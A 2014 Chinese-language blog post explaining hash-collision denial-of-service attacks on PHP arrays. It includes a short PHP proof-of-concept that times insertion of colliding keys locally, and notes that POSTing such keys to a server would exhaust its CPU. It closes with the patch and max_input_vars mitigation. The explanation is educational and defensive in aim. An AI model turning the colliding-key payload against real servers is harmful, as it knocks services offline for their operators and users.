---
id: 1340
title: 说说hash collision
date: 2014-05-31T15:38:00+00:00
author: 偶尔陶醉
layout: post
guid: http://www.stutostu.com/?p=1340
permalink: /?p=1340
categories:
  - 开发
tags:
  - hash
  - 哈希碰撞
  - 攻击
---

hash collision，也就是平常说的哈希碰撞，其方法就是利用已知的hash算法，生成不均匀的哈希，导致其名为hash table而实际性能却早已退化为单链表。。。因为单链表效率非常低，所以也导致了有人利用这个漏洞进行拒绝服务攻击。。

一般的编程语言都是采用经典的time33算法，又称为DJBX33A算法，PHP，python，ruby，java等也是采用这个算法（有兴趣的同学可以看看PHP time33的源码：[https://github.com/php/php-src/blob/master/Zend/zend_hash.h#L269](https://github.com/php/php-src/blob/master/Zend/zend_hash.h#L269 "https://github.com/php/php-src/blob/master/Zend/zend_hash.h#L269")）

以PHP为例，PHP的array的key值，就是用time33算出来的值与数组的长度进行“&”按位与运算。。利用这个特征，我们可以构造出一组精心设计过的key值，然后post给目标服务器，目标服务器在解析成$_POST数组的时候，就不知不觉的转变为了低性能的单链表，从而达到，占据大量CPU处理时间，卡死服务，达到拒绝服务攻击。。。

有兴趣的同学可以跑下下面的代码（代码转自[http://www.laruence.com/2011/12/30/2435.html](http://www.laruence.com/2011/12/30/2435.html "http://www.laruence.com/2011/12/30/2435.html")）

```php
<?php
$size = pow(2, 16);

$startTime = microtime(true);
$array = array();
for ($key = 0, $maxKey = ($size - 1) * $size; $key <= $maxKey; $key += $size) {
    $array[$key] = 0;
}
$endTime = microtime(true);
echo '插入 ', $size, ' 个恶意的元素需要 ', $endTime - $startTime, ' 秒', "\n";

$startTime = microtime(true);
$array = array();
for ($key = 0, $maxKey = $size - 1; $key <= $maxKey; ++$key) {
    $array[$key] = 0;
}
$endTime = microtime(true);
echo '插入 ', $size, ' 个普通元素需要 ', $endTime - $startTime, ' 秒', "\n";
```

利用这个情况，我们只要稍加修改，把恶意元素的key储存起来，然后post给目标服务器，就可以达到攻击对方的效果。。。这是个全方位的攻击，只要服务器接收到POST值并进行解析的时候，攻击效果就会触发，导致目标服务器大量的CPU资源被占据，无法正常响应正常的服务请求。。。

唯一的解决办法就是升级打补丁来解决，PHP ≥ 5.3.9 的版本，在php.ini加入了一个max_input_vars 新的参数来限制最大的解析参数值，不填的情况下默认是1000，也就是默认是限制解析最大是1000个GET/POST/COOKIE的变量。。。

对于大量部署在PHP5.4以下的版本，我只能说，快升级吧！！！